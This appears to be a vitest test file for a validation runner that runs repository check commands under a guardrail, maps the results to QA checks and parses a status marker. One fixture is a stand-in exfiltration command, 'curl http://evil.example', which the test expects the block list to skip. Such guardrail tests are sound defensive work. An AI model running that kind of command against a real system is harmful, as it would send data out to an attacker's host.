import { describe, expect, it } from "vitest";

import type { CheckCommand } from "./check-command-profile";
import {
  parseValidationChecksMarker,
  qaChecksFromValidation,
  runValidationCommands,
  serializeValidationChecksMarker,
  type CommandSpawn,
  type ValidationCommandResult,
} from "./validation-runner";

// ─── Helpers ──────────────────────────────────────────────────────────────────

/** Builds a CheckCommand with sensible defaults, overridable per test. */
function makeCommand(overrides: Partial<CheckCommand> & { command: string }): CheckCommand {
  return {
    id: overrides.id ?? overrides.command,
    command: overrides.command,
    description: overrides.description ?? overrides.command,
    failOnError: overrides.failOnError ?? true,
    timeoutSeconds: overrides.timeoutSeconds ?? 60,
    order: overrides.order ?? 10,
  };
}

/**
 * Builds a spawn stub driven by a map from command string → fake process result.
 * Records the (command, cwd, timeoutMs) of every invocation.
 */
function makeSpawn(
  responses: Record<
    string,
    { exitCode: number; output: string; timedOut?: boolean }
  >
): CommandSpawn & { calls: Array<{ command: string; cwd: string; timeoutMs: number }> } {
  const calls: Array<{ command: string; cwd: string; timeoutMs: number }> = [];
  const fn = (async (command: string, cwd: string, timeoutMs: number) => {
    calls.push({ command, cwd, timeoutMs });
    const r = responses[command];
    if (!r) {
      throw new Error(`Unexpected command spawned: ${command}`);
    }
    return { exitCode: r.exitCode, output: r.output, timedOut: r.timedOut ?? false };
  }) as CommandSpawn & { calls: typeof calls };
  fn.calls = calls;
  return fn;
}

// ─── runValidationCommands ──────────────────────────────────────────────────

describe("runValidationCommands", () => {
  it("returns allPassed=true when every command exits 0", async () => {
    const spawn = makeSpawn({
      "npx tsc --noEmit": { exitCode: 0, output: "ok" },
      "npm run test": { exitCode: 0, output: "1 passed" },
    });

    const result = await runValidationCommands({
      repoPath: "/repo",
      commands: [
        makeCommand({ id: "tsc", command: "npx tsc --noEmit" }),
        makeCommand({ id: "test", command: "npm run test" }),
      ],
      spawn,
    });

    expect(result.allPassed).toBe(true);
    expect(result.results).toHaveLength(2);
    expect(result.results.every((r) => r.passed && !r.skipped)).toBe(true);
    expect(result.results[0]).toMatchObject({
      id: "tsc",
      kind: "tsc",
      command: "npx tsc --noEmit",
      exitCode: 0,
      passed: true,
      skipped: false,
    });
    // Per-command timeout (60s) is forwarded as milliseconds.
    expect(spawn.calls[0]).toEqual({
      command: "npx tsc --noEmit",
      cwd: "/repo",
      timeoutMs: 60_000,
    });
  });

  it("returns allPassed=false when any command fails", async () => {
    const spawn = makeSpawn({
      "npx tsc --noEmit": { exitCode: 0, output: "ok" },
      "npm run test": { exitCode: 1, output: "1 failed" },
    });

    const result = await runValidationCommands({
      repoPath: "/repo",
      commands: [
        makeCommand({ id: "tsc", command: "npx tsc --noEmit" }),
        makeCommand({ id: "test", command: "npm run test" }),
      ],
      spawn,
    });

    expect(result.allPassed).toBe(false);
    expect(result.results[0].passed).toBe(true);
    expect(result.results[1]).toMatchObject({
      id: "test",
      passed: false,
      exitCode: 1,
      skipped: false,
    });
  });

  it("skips a guardrail-denied command without counting it as a failure", async () => {
    const spawn = makeSpawn({
      "npm run test": { exitCode: 0, output: "ok" },
    });

    const result = await runValidationCommands({
      repoPath: "/repo",
      commands: [
        // Blocked by DEFAULT_BLOCKED_COMMANDS ("curl") in the full profile.
        makeCommand({ id: "exfil", command: "curl http://evil.example" }),
        makeCommand({ id: "test", command: "npm run test" }),
      ],
      spawn,
    });

    const skipped = result.results[0];
    expect(skipped.skipped).toBe(true);
    expect(skipped.passed).toBe(false);
    expect(skipped.skipReason).toBeTruthy();
    expect(skipped.exitCode).toBe(0);
    expect(skipped.output).toBe("");
    // The denied command was never spawned.
    expect(spawn.calls.map((c) => c.command)).toEqual(["npm run test"]);
    // One command ran and passed → allPassed true (skip is neither pass nor fail).
    expect(result.allPassed).toBe(true);
  });

  it("skips a command outside the allow-list (e.g. pytest) under the default profile", async () => {
    const spawn = makeSpawn({});

    const result = await runValidationCommands({
      repoPath: "/repo",
      commands: [makeCommand({ id: "pytest", command: "pytest" })],
      spawn,
    });

    expect(result.results[0].skipped).toBe(true);
    expect(spawn.calls).toHaveLength(0);
    // Every command skipped → nothing ran → allPassed false.
    expect(result.allPassed).toBe(false);
  });

  it("treats a timed-out command as not passed", async () => {
    const spawn = makeSpawn({
      "npm run build": { exitCode: 0, output: "partial", timedOut: true },
    });

    const result = await runValidationCommands({
      repoPath: "/repo",
      commands: [
        makeCommand({ id: "build", command: "npm run build", timeoutSeconds: 5 }),
      ],
      spawn,
    });

    expect(result.results[0].passed).toBe(false);
    expect(result.results[0].skipped).toBe(false);
    expect(result.results[0].output).toContain("timed out");
    expect(result.allPassed).toBe(false);
    expect(spawn.calls[0].timeoutMs).toBe(5_000);
  });

  it("truncates very long output", async () => {
    const huge = "x".repeat(10_000);
    const spawn = makeSpawn({
      "npm run test": { exitCode: 0, output: huge },
    });

    const result = await runValidationCommands({
      repoPath: "/repo",
      commands: [makeCommand({ id: "test", command: "npm run test" })],
      spawn,
    });

    expect(result.results[0].output.length).toBeLessThan(huge.length);
    expect(result.results[0].output).toContain("[truncated]");
  });
});

// ─── qaChecksFromValidation ─────────────────────────────────────────────────

describe("qaChecksFromValidation", () => {
  it("maps non-skipped results to the QA checks shape", () => {
    const results: ValidationCommandResult[] = [
      {
        id: "tsc",
        kind: "tsc",
        command: "npx tsc --noEmit",
        passed: true,
        exitCode: 0,
        output: "ok",
        skipped: false,
      },
      {
        id: "test",
        kind: "test",
        command: "npm run test",
        passed: false,
        exitCode: 1,
        output: "fail",
        skipped: false,
      },
      {
        id: "exfil",
        kind: "exfil",
        command: "curl x",
        passed: false,
        exitCode: 0,
        output: "",
        skipped: true,
        skipReason: "blocked",
      },
    ];

    const checks = qaChecksFromValidation(results);

    // Skipped results are excluded.
    expect(checks).toHaveLength(2);
    expect(checks[0]).toEqual({
      label: "tsc: npx tsc --noEmit",
      passed: true,
      category: "validation",
      actionable: false,
    });
    expect(checks[1]).toEqual({
      label: "test: npm run test",
      passed: false,
      category: "validation",
      actionable: true,
    });
  });

  it("produces an array that requiredChecksPassed-style logic can evaluate", () => {
    const allPassing: ValidationCommandResult[] = [
      {
        id: "lint",
        kind: "lint",
        command: "npm run lint",
        passed: true,
        exitCode: 0,
        output: "",
        skipped: false,
      },
    ];

    const checks = qaChecksFromValidation(allPassing);
    expect(checks.every((c) => c.passed)).toBe(true);
    // Shape round-trips through JSON exactly as qa-service stores it.
    const roundTripped = JSON.parse(JSON.stringify(checks));
    expect(roundTripped).toEqual(checks);
  });

  it("returns an empty array when every result was skipped", () => {
    const results: ValidationCommandResult[] = [
      {
        id: "pytest",
        kind: "pytest",
        command: "pytest",
        passed: false,
        exitCode: 0,
        output: "",
        skipped: true,
        skipReason: "not allowed",
      },
    ];
    expect(qaChecksFromValidation(results)).toEqual([]);
  });
});

describe("validation checks marker (worker ↔ QA gate)", () => {
  const RESULTS: ValidationCommandResult[] = [
    {
      id: "tsc",
      kind: "tsc",
      command: "npx tsc --noEmit",
      passed: true,
      exitCode: 0,
      output: "",
      skipped: false,
    },
    {
      id: "test",
      kind: "test",
      command: "npm run test",
      passed: false,
      exitCode: 1,
      output: "2 failed",
      skipped: false,
    },
  ];

  it("round-trips checks through the marker", () => {
    const marker = serializeValidationChecksMarker(RESULTS);
    const parsed = parseValidationChecksMarker(
      `## Validation summary\n- stuff\n\n${marker}`
    );

    expect(parsed).toEqual(qaChecksFromValidation(RESULTS));
  });

  it("parses the LAST marker when a rework appended a fresh block", () => {
    const first = serializeValidationChecksMarker([RESULTS[1]]);
    const second = serializeValidationChecksMarker([RESULTS[0]]);
    const parsed = parseValidationChecksMarker(`${first}\n\nrework ran\n\n${second}`);

    expect(parsed).toHaveLength(1);
    expect(parsed?.[0].passed).toBe(true);
  });

  it("returns null when no marker exists or the JSON is corrupt", () => {
    expect(parseValidationChecksMarker(null)).toBeNull();
    expect(parseValidationChecksMarker("plain text output")).toBeNull();
    expect(
      parseValidationChecksMarker("<!-- avion:validation-checks {broken -->")
    ).toBeNull();
  });

  it("drops malformed entries while keeping valid ones", () => {
    const parsed = parseValidationChecksMarker(
      '<!-- avion:validation-checks [{"label":"ok","passed":true},{"nope":1}] -->'
    );
    expect(parsed).toEqual([{ label: "ok", passed: true }]);
  });
});
